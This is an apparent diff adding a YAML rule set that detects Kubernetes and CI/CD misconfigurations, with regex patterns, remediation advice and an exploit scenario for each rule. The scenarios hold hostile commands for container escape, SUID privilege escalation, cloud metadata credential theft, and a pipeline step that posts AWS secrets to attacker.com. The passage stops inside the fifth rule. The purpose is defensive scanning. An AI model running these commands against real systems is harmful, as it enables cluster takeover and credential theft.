@@ -1,0 +1,2430 @@
+rules:
+- rule_id: DEVOPS-YAML-001
+  title: Privileged Container Configuration
+  description: 'Detects Kubernetes pod or container configurations running with privileged mode enabled, granting full host access. Privileged containers bypass nearly all kernel-level isolation and gain
+    direct access to host devices, filesystems, and kernel modules. This is one of the most dangerous misconfigurations in Kubernetes environments.
+
+    '
+  language: yaml
+  category: devops
+  severity: Critical
+  confidence: 0.96
+  cwe: CWE-250
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - privileged-container
+  - container-security
+  - pod-security
+  - cis-benchmark
+  - container-escape
+  - pss-restricted
+  patterns:
+  - type: regex
+    pattern: privileged\s*:\s*true
+  - type: regex
+    pattern: securityContext\s*:\s*\n\s+privileged\s*:\s*true
+  - type: regex
+    pattern: securityContext\s*:\s*\{[^}]*privileged\s*:\s*true[^}]*\}
+  - type: regex
+    pattern: spec\s*:\s*\n(?:\s+.*\n){0,20}?\s+privileged\s*:\s*true
+  - type: regex
+    pattern: (?:containers|initContainers)\s*:\s*\n(?:\s+.*\n){0,20}?\s+privileged\s*:\s*true
+  - type: regex
+    pattern: helm\.sh/chart.*\n(?:.*\n){0,20}?privileged\s*:\s*true
+  anti_patterns:
+  - 'privileged: false'
+  - '# required for'
+  - initContainer
+  - 'pod-security.kubernetes.io/enforce: restricted'
+  - 'pod-security.kubernetes.io/enforce: baseline'
+  - constraints/K8sPSPPrivilegedContainer
+  - ConstraintTemplate
+  - kube-bench
+  - policy/v1beta1
+  - calico.org/v3
+  - security.istio.io
+  - gatekeeper.sh/constraint
+  - "securityContext:\n            privileged: false"
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: DaemonSet'
+    - 'kind: StatefulSet'
+    - 'kind: Job'
+    - 'kind: CronJob'
+    - 'kind: ReplicaSet'
+    - 'securityContext:'
+    - 'containers:'
+    taint_source_indicators:
+    - values.yaml
+    - helm template
+    - '{{ .Values.securityContext'
+    - 'env:'
+    - configMapKeyRef
+    taint_sink_indicators:
+    - 'privileged: true'
+    - 'securityContext:'
+    - /dev mount
+    - 'hostPath:'
+    sanitization_patterns:
+    - 'privileged: false'
+    - PodSecurityPolicy
+    - pod-security.kubernetes.io/enforce
+    - OPA Gatekeeper constraint
+    - Kyverno policy
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.98
+  exploit_scenario:
+    attack_example: 'Container Escape via Privileged Mode: An attacker who gains code execution in a privileged container can mount the host filesystem using `mount /dev/sda1 /mnt`, chroot into the host,
+      and gain full root access to the underlying node. From the node, they can access the kubelet credentials, steal secrets from all pods on the node, and pivot to other nodes in the cluster.
+
+      '
+    example_payload: '# From within a privileged container:
+
+      mkdir /host-root
+
+      mount /dev/sda1 /host-root
+
+      chroot /host-root
+
+      cat /var/lib/kubelet/kubeconfig
+
+      kubectl --kubeconfig=/var/lib/kubelet/kubeconfig get secrets --all-namespaces
+
+      '
+    attacker_objective: 'Escape container isolation, gain root access to the host node, steal cluster credentials, and achieve lateral movement across the Kubernetes cluster.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.98
+    context_match: 0.95
+    proximity_to_user_input: 0.3
+    sanitization_absence: 0.97
+  impact: 'Privileged containers have full access to the host''s devices, kernel
+
+    modules, and filesystem. An attacker who compromises a privileged container
+
+    effectively gains root access to the underlying host node. This is
+
+    categorized as a critical finding by CIS Kubernetes Benchmark 5.2.1.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Set privileged: false (default) in all container securityContext blocks\n- Apply the PSS restricted profile: pod-security.kubernetes.io/enforce: restricted\n\
+    \n## CIS Benchmark References\n- CIS Kubernetes Benchmark 5.2.1: Minimize the admission of privileged containers\n- CIS Docker Benchmark 5.4: Ensure privileged containers are not used\n\n## Helm Chart\
+    \ Hardening\n- Override values.yaml: securityContext.privileged=false\n- Use helm-values security scanning (e.g., checkov, kubesec)\n- Template validation: helm template . | kubesec scan -\n\n## OPA\
+    \ Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  container.securityContext.privileged\
+    \ == true\n  msg := sprintf(\"Privileged container not allowed: %v\", [container.name])\n}\n```\n\n## Additional Remediation\n- Use specific capabilities instead of full privilege escalation\n- Apply\
+    \ seccomp and AppArmor profiles for fine-grained access control\n- Deploy Kyverno or OPA Gatekeeper to enforce at admission time\n- Use Pod Security Admission controller in enforce mode\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/250.html
+  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html
+  - https://attack.mitre.org/techniques/T1611/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-002
+    - DEVOPS-YAML-006
+    - DEVOPS-YAML-009
+    - DEVOPS-YAML-003
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-002
+  title: Privilege Escalation Allowed
+  description: 'Detects containers with allowPrivilegeEscalation set to true, enabling processes to gain more privileges than their parent. This allows setuid binaries and other privilege escalation vectors
+    within the container, potentially allowing a non-root process to gain root-level access through SUID/SGID binaries, kernel exploits, or capability manipulation.
+
+    '
+  language: yaml
+  category: devops
+  severity: High
+  confidence: 0.95
+  cwe: CWE-269
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - privilege-escalation
+  - security-context
+  - setuid
+  - cis-benchmark
+  - pss-restricted
+  patterns:
+  - type: regex
+    pattern: allowPrivilegeEscalation\s*:\s*true
+  - type: regex
+    pattern: securityContext\s*:\s*\n(?:\s+.*\n){0,20}?\s+allowPrivilegeEscalation\s*:\s*true
+  - type: regex
+    pattern: securityContext\s*:\s*\{[^}]*allowPrivilegeEscalation\s*:\s*true[^}]*\}
+  - type: regex
+    pattern: containers\s*:\s*\n(?:\s+.*\n){0,20}?\s+allowPrivilegeEscalation\s*:\s*true
+  - type: regex
+    pattern: (?:initContainers|ephemeralContainers)\s*:\s*\n(?:\s+.*\n){0,20}?\s+allowPrivilegeEscalation\s*:\s*true
+  anti_patterns:
+  - 'allowPrivilegeEscalation: false'
+  - 'pod-security.kubernetes.io/enforce: restricted'
+  - 'pod-security.kubernetes.io/enforce: baseline'
+  - constraints/K8sPSPAllowPrivilegeEscalation
+  - gatekeeper.sh/constraint
+  - kyverno.io/policy
+  - calico.org/v3
+  - security.istio.io
+  - kube-bench
+  - '# kube-system required'
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: DaemonSet'
+    - 'kind: StatefulSet'
+    - 'kind: Job'
+    - 'kind: CronJob'
+    - 'securityContext:'
+    - 'containers:'
+    taint_source_indicators:
+    - values.yaml
+    - helm template
+    - '{{ .Values.'
+    - setuid binary
+    - SUID
+    taint_sink_indicators:
+    - 'allowPrivilegeEscalation: true'
+    - 'securityContext:'
+    - 'capabilities:'
+    - 'add:'
+    sanitization_patterns:
+    - 'allowPrivilegeEscalation: false'
+    - 'drop: ["ALL"]'
+    - PodSecurityPolicy
+    - pod-security.kubernetes.io/enforce
+    - 'runAsNonRoot: true'
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.85
+  exploit_scenario:
+    attack_example: 'SUID-based Privilege Escalation: An attacker with shell access in a container where allowPrivilegeEscalation is true can exploit setuid binaries (e.g., /usr/bin/passwd, /usr/bin/newgrp)
+      or plant a crafted SUID binary to escalate from an unprivileged user to root within the container. Combined with other misconfigurations such as writable root filesystem or dangerous capabilities,
+      this can lead to a container breakout.
+
+      '
+    example_payload: '# Find and exploit SUID binaries
+
+      find / -perm -4000 -type f 2>/dev/null
+
+      # Exploit a known SUID binary for root shell
+
+      /usr/bin/find . -exec /bin/sh -p \;
+
+      # Or copy bash with SUID
+
+      cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
+
+      /tmp/rootbash -p
+
+      '
+    attacker_objective: 'Escalate from an unprivileged container process to root within the container, then leverage additional misconfigurations for container escape and cluster-wide compromise.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.96
+    context_match: 0.93
+    proximity_to_user_input: 0.25
+    sanitization_absence: 0.95
+  impact: 'Allows container processes to escalate privileges via setuid binaries,
+
+    capabilities, or other kernel mechanisms, potentially gaining root.
+
+    This violates the Kubernetes Pod Security Standards restricted profile
+
+    and CIS Benchmark 5.2.5.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Set allowPrivilegeEscalation: false in securityContext\n- Apply the PSS restricted profile which requires this by default\n\n## CIS Benchmark References\n\
+    - CIS Kubernetes Benchmark 5.2.5: Minimize the admission of containers with allowPrivilegeEscalation\n- Ensure no-new-privileges is set at the container runtime level\n\n## Helm Chart Hardening\n- Default\
+    \ securityContext in values.yaml:\n  securityContext:\n    allowPrivilegeEscalation: false\n    capabilities:\n      drop: [\"ALL\"]\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg]\
+    \ {\n  input.request.kind.kind == \"Pod\"\n  container := input.request.object.spec.containers[_]\n  container.securityContext.allowPrivilegeEscalation == true\n  msg := sprintf(\"Privilege escalation\
+    \ not allowed for container: %v\", [container.name])\n}\n```\n\n## Additional Remediation\n- Drop all capabilities: capabilities: { drop: [\"ALL\"] }\n- Set runAsNonRoot: true\n- Remove all SUID/SGID\
+    \ binaries from container images\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/269.html
+  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1548/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: false
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-001
+    - DEVOPS-YAML-006
+    - DEVOPS-YAML-009
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-003
+  title: Host Network Namespace Sharing
+  description: 'Detects pods configured to use the host''s network namespace, PID namespace, or IPC namespace, enabling access to host network interfaces, processes, and inter-process communication. This
+    breaks container isolation boundaries and allows the pod to interact directly with host-level services, sniff traffic, and access host process information.
+
+    '
+  language: yaml
+  category: devops
+  severity: High
+  confidence: 0.94
+  cwe: CWE-284
+  owasp: A05:2021-Security-Misconfiguration
+  tags:
+  - kubernetes
+  - host-network
+  - network-isolation
+  - host-pid
+  - host-ipc
+  - lateral-movement
+  - cis-benchmark
+  - pss-baseline
+  patterns:
+  - type: regex
+    pattern: hostNetwork\s*:\s*true
+  - type: regex
+    pattern: hostPID\s*:\s*true
+  - type: regex
+    pattern: hostIPC\s*:\s*true
+  - type: regex
+    pattern: spec\s*:\s*\n(?:\s+.*\n){0,20}?\s+hostNetwork\s*:\s*true
+  - type: regex
+    pattern: spec\s*:\s*\n(?:\s+.*\n){0,20}?\s+hostPID\s*:\s*true
+  - type: regex
+    pattern: spec\s*:\s*\n(?:\s+.*\n){0,20}?\s+hostIPC\s*:\s*true
+  - type: regex
+    pattern: hostPort\s*:\s*\d+
+  - type: regex
+    pattern: dnsPolicy\s*:\s*ClusterFirstWithHostNet
+  anti_patterns:
+  - 'hostNetwork: false'
+  - '# kube-system'
+  - '# CNI'
+  - 'pod-security.kubernetes.io/enforce: restricted'
+  - 'pod-security.kubernetes.io/enforce: baseline'
+  - constraints/K8sPSPHostNamespace
+  - constraints/K8sPSPHostNetworkingPorts
+  - gatekeeper.sh/constraint
+  - NetworkPolicy
+  - calico.org/v3
+  - security.istio.io/v1
+  - PeerAuthentication
+  - AuthorizationPolicy
+  - kube-bench
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Pod'
+    - 'kind: Deployment'
+    - 'kind: DaemonSet'
+    - 'kind: StatefulSet'
+    - 'spec:'
+    - 'template:'
+    - 'metadata:'
+    taint_source_indicators:
+    - values.yaml
+    - helm template
+    - '{{ .Values.hostNetwork'
+    - nodeSelector
+    - tolerations
+    taint_sink_indicators:
+    - 'hostNetwork: true'
+    - 'hostPID: true'
+    - 'hostIPC: true'
+    - 'hostPort:'
+    - 'dnsPolicy: ClusterFirstWithHostNet'
+    sanitization_patterns:
+    - 'hostNetwork: false'
+    - 'hostPID: false'
+    - 'hostIPC: false'
+    - NetworkPolicy
+    - calico GlobalNetworkPolicy
+    - istio PeerAuthentication
+    - pod-security.kubernetes.io/enforce
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.82
+  exploit_scenario:
+    attack_example: 'Lateral Movement via Host Network: An attacker in a pod with hostNetwork enabled can bind to any port on the host, intercept traffic intended for other services, access the kubelet
+      API on 10250, reach the metadata service (169.254.169.254), and communicate with all other pods on the node bypassing Kubernetes NetworkPolicies. With hostPID, they can also inspect and ptrace host
+      processes to steal credentials.
+
+      '
+    example_payload: '# With hostNetwork: scan for kubelet API
+
+      curl -sk https://localhost:10250/pods
+
+      # Access cloud metadata service
+
+      curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+      # With hostPID: inspect host processes
+
+      ps aux
+
+      cat /proc/1/environ
+
+      # Sniff network traffic on the host
+
+      tcpdump -i eth0 -w /tmp/capture.pcap
+
+      '
+    attacker_objective: 'Bypass network isolation, access the node''s network stack for lateral movement, steal cloud provider instance credentials from the metadata service, and intercept inter-pod communication.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.95
+    context_match: 0.92
+    proximity_to_user_input: 0.2
+    sanitization_absence: 0.94
+  impact: 'Pods sharing host namespaces can access host-level network services,
+
+    processes, and IPC mechanisms, bypassing network policies and enabling
+
+    lateral movement within the cluster. This violates CIS Kubernetes
+
+    Benchmark 5.2.4 (hostNetwork), 5.2.2 (hostPID), and 5.2.3 (hostIPC).
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Set hostNetwork: false (default)\n- Set hostPID: false and hostIPC: false\n- Apply the PSS baseline profile which prohibits host namespaces\n\n##\
+    \ CIS Benchmark References\n- CIS Kubernetes Benchmark 5.2.4: Minimize the admission of containers wishing to share the host network namespace\n- CIS Kubernetes Benchmark 5.2.2: Minimize the admission\
+    \ of containers wishing to share the host process ID namespace\n- CIS Kubernetes Benchmark 5.2.3: Minimize the admission of containers wishing to share the host IPC namespace\n\n## Helm Chart Hardening\n\
+    - Set hostNetwork: false as default in values.yaml\n- Add conditional checks: {{- if not .Values.hostNetwork }}\n- Validate templates: helm template . | conftest test -\n\n## OPA Rego Policy\n```rego\n\
+    package kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"Pod\"\n  input.request.object.spec.hostNetwork == true\n  msg := \"Pods with host network access are not allowed\"\n}\ndeny[msg]\
+    \ {\n  input.request.kind.kind == \"Pod\"\n  input.request.object.spec.hostPID == true\n  msg := \"Pods with host PID namespace are not allowed\"\n}\n```\n\n## Network Policy Enforcement\n- Use Kubernetes\
+    \ NetworkPolicies for pod-to-pod communication\n- Deploy Calico or Cilium for advanced network policy enforcement\n- Use Istio AuthorizationPolicy for service mesh mTLS\n- Only use host networking for\
+    \ system-level DaemonSets when required\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/284.html
+  - https://kubernetes.io/docs/concepts/security/pod-security-standards/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1599/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: low
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-001
+    - DEVOPS-YAML-009
+    - DEVOPS-YAML-006
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-004
+  title: Hardcoded Secrets in YAML Configuration
+  description: 'Detects hardcoded passwords, tokens, keys, and credentials in Kubernetes manifests, Docker Compose files, and CI/CD configuration. Secrets committed to version control persist in git history
+    even after removal and can be harvested by anyone with repository access, including through leaked backups, forks, and CI/CD logs.
+
+    '
+  language: yaml
+  category: devops
+  severity: Critical
+  confidence: 0.9
+  cwe: CWE-798
+  owasp: A07:2021-Identification-and-Authentication-Failures
+  tags:
+  - hardcoded-secrets
+  - kubernetes
+  - docker-compose
+  - ci-cd
+  - credential-exposure
+  - cis-benchmark
+  - secret-management
+  - git-security
+  patterns:
+  - type: regex
+    pattern: (?:password|passwd|secret|token|api_key|apikey|access_key|private_key)\s*:\s*['"]?[a-zA-Z0-9_/+=\-]{8,}['"]?
+  - type: regex
+    pattern: DATABASE_URL\s*:\s*['"]?(?:postgres|mysql|mongodb)://[^:]+:[^@]+@
+  - type: regex
+    pattern: (?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID)\s*:\s*['"]?[A-Za-z0-9/+=]{20,}['"]?
+  - type: regex
+    pattern: (?:GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|NPM_TOKEN)\s*:\s*['"]?[a-zA-Z0-9_\-]{20,}['"]?
+  - type: regex
+    pattern: data:\s*\n(?:\s+\w+:\s*[A-Za-z0-9+/=]{20,}\s*\n)+
+  - type: regex
+    pattern: (?:AZURE_CLIENT_SECRET|AZURE_TENANT_ID|AZURE_SUBSCRIPTION_ID)\s*:\s*['"]?[a-zA-Z0-9\-]{20,}['"]?
+  - type: regex
+    pattern: (?:GCP_SERVICE_ACCOUNT_KEY|GOOGLE_APPLICATION_CREDENTIALS)\s*:\s*['"]?[a-zA-Z0-9_/+=\-]{20,}['"]?
+  - type: regex
+    pattern: stringData\s*:\s*\n(?:\s+\w+:\s*\S{8,}\s*\n)+
+  - type: regex
+    pattern: (?:REDIS_PASSWORD|MONGO_PASSWORD|MYSQL_ROOT_PASSWORD|POSTGRES_PASSWORD)\s*:\s*['"]?[^\s$\{]{8,}['"]?
+  - type: regex
+    pattern: (?:smtp_password|mail_password|email_password)\s*:\s*['"]?[^\s$\{]{6,}['"]?
+  - type: regex
+    pattern: (?:SLACK_TOKEN|SLACK_WEBHOOK|DISCORD_TOKEN|TWILIO_AUTH)\s*:\s*['"]?[a-zA-Z0-9\-_/]{20,}['"]?
+  - type: regex
+    pattern: ssh-rsa\s+AAAA[0-9A-Za-z+/=]{100,}
+  - type: regex
+    pattern: '-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----'
+  anti_patterns:
+  - secretKeyRef
+  - valueFrom
+  - ${{secrets.
+  - ${{ secrets.
+  - ${{
+  - changeme
+  - placeholder
+  - example
+  - TODO
+  - vault.hashicorp
+  - external-secrets.io
+  - sealed-secrets
+  - ExternalSecret
+  - 'kind: SealedSecret'
+  - 'sops:'
+  - 'enc: '
+  - ENC[
+  - CHANGE_ME
+  - your-password-here
+  - password-goes-here
+  - <REDACTED>
+  - arn:aws:secretsmanager
+  - gatekeeper.sh/constraint
+  context_awareness:
+    surrounding_context_patterns:
+    - 'kind: Secret'
+    - 'kind: ConfigMap'
+    - 'kind: Deployment'
+    - docker-compose
+    - 'env:'
+    - 'environment:'
+    - 'data:'
+    - 'stringData:'
+    - .github/workflows
+    - .gitlab-ci.yml
+    taint_source_indicators:
+    - values.yaml
+    - 'env:'
+    - 'environment:'
+    - 'data:'
+    - 'stringData:'
+    - configMapKeyRef
+    - .env
+    - docker-compose.yml
+    taint_sink_indicators:
+    - 'password:'
+    - 'secret:'
+    - 'token:'
+    - 'api_key:'
+    - 'connection_string:'
+    - 'DATABASE_URL:'
+    - 'credentials:'
+    sanitization_patterns:
+    - secretKeyRef
+    - valueFrom
+    - ExternalSecret
+    - SealedSecret
+    - vault.hashicorp.com
+    - external-secrets.io
+    - ${{ secrets.
+    - sops encrypted
+    - aws secretsmanager
+    - Azure Key Vault
+  severity_scoring:
+    severity_weight: 10
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.95
+  exploit_scenario:
+    attack_example: 'Secret Theft via Repository Access: An attacker gains read access to a repository (e.g., through a leaked token, insider threat, or public repo) containing hardcoded database credentials
+      in a Kubernetes Secret manifest. They use the credentials to access the production database directly, exfiltrate customer data, or inject malicious records. Even if the secret is later removed from
+      the file, it persists in git history.
+
+      '
+    example_payload: '# Extract secrets from git history
+
+      git log --all --full-history -- "**/secrets.yaml" "**/configmap.yaml"
+
+      git show <commit-hash>:k8s/secrets.yaml
+
+      # Decode base64 Kubernetes secrets
+
+      echo "cGFzc3dvcmQxMjM=" | base64 -d
+
+      # Connect to exposed database
+
+      psql "postgresql://admin:password123@db.example.com:5432/production"
+
+      '
+    attacker_objective: 'Harvest credentials from version control history, CI/CD logs, or artifact caches to gain unauthorized access to databases, cloud services, APIs, and internal systems.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.88
+    context_match: 0.92
+    proximity_to_user_input: 0.7
+    sanitization_absence: 0.9
+  impact: 'Hardcoded secrets in YAML configurations are committed to version control,
+
+    exposing credentials to anyone with repository access, including in CI/CD logs.
+
+    This violates CIS Benchmark 5.4.1 and can lead to full system compromise
+
+    through credential reuse attacks.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Use Kubernetes Secrets with encryption at rest (EncryptionConfiguration)\n- Never store secrets in ConfigMaps or plain YAML manifests\n\n## CIS Benchmark\
+    \ References\n- CIS Kubernetes Benchmark 5.4.1: Prefer using secrets as files over secrets as environment variables\n- CIS Kubernetes Benchmark 5.4.2: Consider external secret storage\n\n## Helm Chart\
+    \ Hardening\n- Use external-secrets operator with Helm charts\n- Reference secrets via secretKeyRef in values.yaml\n- Use sealed-secrets for GitOps: kubeseal --format yaml < secret.yaml > sealed-secret.yaml\n\
+    - Never commit values files with actual secrets\n\n## OPA Rego Policy\n```rego\npackage kubernetes.admission\ndeny[msg] {\n  input.request.kind.kind == \"ConfigMap\"\n  value := input.request.object.data[key]\n\
+    \  re_match(\"(?i)(password|secret|token|api.?key)\", key)\n  msg := sprintf(\"ConfigMap contains potential secret key: %v\", [key])\n}\n```\n\n## Additional Remediation\n- Use sealed-secrets for GitOps\
+    \ workflows\n- Use HashiCorp Vault, AWS Secrets Manager, or Azure Key Vault\n- Use SOPS for encrypting secrets in git\n- Implement git pre-commit hooks (detect-secrets, gitleaks)\n- Rotate all exposed\
+    \ credentials immediately\n- Scan git history: gitleaks detect --source=.\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/798.html
+  - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html
+  - https://kubernetes.io/docs/concepts/configuration/secret/
+  - https://www.cisecurity.org/benchmark/kubernetes
+  - https://attack.mitre.org/techniques/T1552/
+  metadata:
+    rule_version: 2.0.0
+    last_reviewed: '2025-01-15'
+    rule_maturity_level: stable
+    detection_complexity: medium
+  cross_rule_intelligence:
+    cross_file_risk_flag: true
+    requires_ai_validation: true
+    high_impact_flag: true
+    related_rules:
+    - DEVOPS-YAML-005
+    - DEVOPS-YAML-008
+  detection_layer: 1
+- rule_id: DEVOPS-YAML-005
+  title: CI/CD Pipeline Secret Exposure
+  description: 'Detects CI/CD pipeline configurations that may expose secrets through logging, artifact caching, insecure environment variable handling, or command-line argument passing. Secrets printed
+    to CI/CD logs are typically stored indefinitely and accessible to anyone with build log access, third-party integrations, and webhook consumers.
+
+    '
+  language: yaml
+  category: devops
+  severity: Medium
+  confidence: 0.8
+  cwe: CWE-532
+  owasp: A09:2021-Security-Logging-and-Monitoring-Failures
+  tags:
+  - ci-cd
+  - github-actions
+  - gitlab-ci
+  - secret-exposure
+  - log-injection
+  - credential-leak
+  - jenkins
+  - azure-devops
+  patterns:
+  - type: regex
+    pattern: echo\s+\$\{\{\s*secrets\.\w+
+  - type: regex
+    pattern: echo\s+\$(?:SECRET|TOKEN|PASSWORD|API_KEY|AWS_SECRET)
+  - type: regex
+    pattern: run\s*:\s*[|>]?\s*\n\s*(?:echo|printf|cat)\s+.*(?:\$\{\{secrets|%SECRET%|\$SECRET|\$TOKEN)
+  - type: regex
+    pattern: env\s*:\s*\n(?:\s+\w+:\s*\$\{\{secrets\.\w+\}\}\s*\n)+
+  - type: regex
+    pattern: (?:curl|wget|httpie)\s+.*(?:Authorization|Bearer|token|api[_-]key)\s*[:=]\s*\$\{\{secrets\.
+  - type: regex
+    pattern: printenv\s+(?:SECRET|TOKEN|PASSWORD|KEY|CREDENTIAL)
+  - type: regex
+    pattern: set\s+-x.*\$\{\{\s*secrets\.
+  - type: regex
+    pattern: docker\s+(?:login|push|pull).*(?:-p|--password)\s+\$\{\{secrets\.
+  - type: regex
+    pattern: '>>?\s*\$GITHUB_OUTPUT.*\$\{\{secrets\.'
+  - type: regex
+    pattern: artifacts\s*:\s*\n(?:\s+.*\n){0,20}?\s+paths\s*:\s*\n\s+-\s*(?:.*\.env|.*credentials|.*\.key|.*\.pem)
+  - type: regex
+    pattern: cache\s*:\s*\n(?:\s+.*\n){0,20}?\s+paths\s*:\s*\n\s+-\s*(?:.*\.env|.*node_modules/\.cache|.*\.aws)
+  - type: regex
+    pattern: script\s*:\s*\n(?:\s+.*\n){0,20}?\s+-\s*(?:echo|cat|printenv)\s+.*(?:\$\w*SECRET|\$\w*TOKEN|\$\w*PASSWORD)
+  anti_patterns:
+  - mask
+  - add-mask
+  - '::add-mask::'
+  - MaskInputs
+  - set +x
+  - gatekeeper.sh/constraint
+  - calico.org/v3
+  - security.istio.io
+  - kube-bench
+  - '# safe: value is not a secret'
+  context_awareness:
+    surrounding_context_patterns:
+    - .github/workflows/
+    - .gitlab-ci.yml
+    - Jenkinsfile
+    - azure-pipelines.yml
+    - .circleci/config.yml
+    - bitbucket-pipelines.yml
+    - 'steps:'
+    - 'jobs:'
+    - 'stages:'
+    taint_source_indicators:
+    - ${{ secrets.
+    - $SECRET_
+    - $TOKEN_
+    - credentials()
+    - withCredentials
+    - env.SECRET
+    - 'variables:'
+    taint_sink_indicators:
+    - echo
+    - printf
+    - cat
+    - printenv
+    - set -x
+    - '>> $GITHUB_OUTPUT'
+    - 'artifacts:'
+    - 'cache:'
+    - curl -H
+    - wget --header
+    sanitization_patterns:
+    - '::add-mask::'
+    - add-mask
+    - 'MaskInputs: true'
+    - set +x
+    - GITHUB_TOKEN is automatically masked
+    - protected variable
+    - 'masked: true'
+  severity_scoring:
+    severity_weight: 8
+    risk_score_formula_hint: severity_weight * confidence * (1 + exploitability_score) / 2
+    exploitability_score: 0.8
+  exploit_scenario:
+    attack_example: 'Secret Exfiltration via CI/CD Logs: An attacker compromises a CI/CD pipeline (e.g., through a malicious PR in a public repo that triggers a workflow, or through a supply chain attack
+      on a GitHub Action). The pipeline prints secrets to build logs, which the attacker harvests. They use the stolen cloud credentials to access production infrastructure, exfiltrate data, or deploy cryptominers.
+
+      '
+    example_payload: "# Malicious step in a GitHub Actions workflow\n- name: Exfiltrate secrets\n  run: |\n    echo \"${{ secrets.AWS_SECRET_ACCESS_KEY }}\" | base64\n    curl -X POST https://attacker.com/collect\
+      \ \\\n      -d \"key=${{ secrets.AWS_ACCESS_KEY_ID }}&secret=${{ secrets.AWS_SECRET_ACCESS_KEY }}\"\n# Or via artifact upload\n- name: Upload credentials\n  run: echo \"${{ secrets.KUBECONFIG }}\"\
+      \ > kubeconfig.yaml\n- uses: actions/upload-artifact@v3\n  with:\n    name: config\n    path: kubeconfig.yaml\n"
+    attacker_objective: 'Exfiltrate secrets from CI/CD pipeline logs, artifacts, or caches to gain unauthorized access to cloud infrastructure, container registries, and production environments.
+
+      '
+  confidence_factors:
+    pattern_strength: 0.82
+    context_match: 0.88
+    proximity_to_user_input: 0.65
+    sanitization_absence: 0.85
+  impact: 'Secrets printed or logged in CI/CD pipelines are exposed in build logs,
+
+    which may be accessible to team members, third-party integrations,
+
+    or attackers who compromise the CI/CD system. Build artifacts and
+
+    caches containing secrets can persist beyond the build lifecycle.
+
+    '
+  remediation: "## Kubernetes Pod Security Standards\n- Ensure CI/CD-deployed workloads follow PSS restricted profile\n- Use OIDC federation instead of long-lived secrets for cloud access\n\n## CIS Benchmark\
+    \ References\n- CIS Software Supply Chain Security Guide: Section 3 - Build Pipelines\n- Never echo or print environment variables containing secrets\n\n## Helm Chart Hardening\n- Use CI/CD native secret\
+    \ injection for Helm values\n- Never pass secrets via helm --set on command line (visible in process lists)\n- Use helm-secrets plugin with SOPS encryption\n\n## OPA Rego Policy\n```rego\npackage cicd.security\n\
+    deny[msg] {\n  step := input.jobs[_].steps[_]\n  contains(step.run, \"echo\")\n  contains(step.run, \"secrets.\")\n  msg := \"CI/CD step echoes secrets to logs\"\n}\n```\n\n## Additional Remediation\n\
+    - Use ::add-mask:: in GitHub Actions to mask values\n- Use CI/CD platform native secret management\n- Avoid passing secrets as command-line arguments (visible in process lists)\n- Audit CI/CD logs for\
+    \ accidental secret exposure\n- Use OIDC tokens instead of static credentials where possible\n- Exclude .env files and credential files from artifact uploads\n- Implement pipeline security scanning\
+    \ with tools like actionlint\n"
+  references:
+  - https://cwe.mitre.org/data/definitions/532.html
+  - https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
+  - https://docs.gitlab.com/ee/ci/variables/#mask-a-cicd-variable
+  - https://attack.mitre.org/techniques/T1552/006/
+  metadata:
+    rule_version: 2.0.0
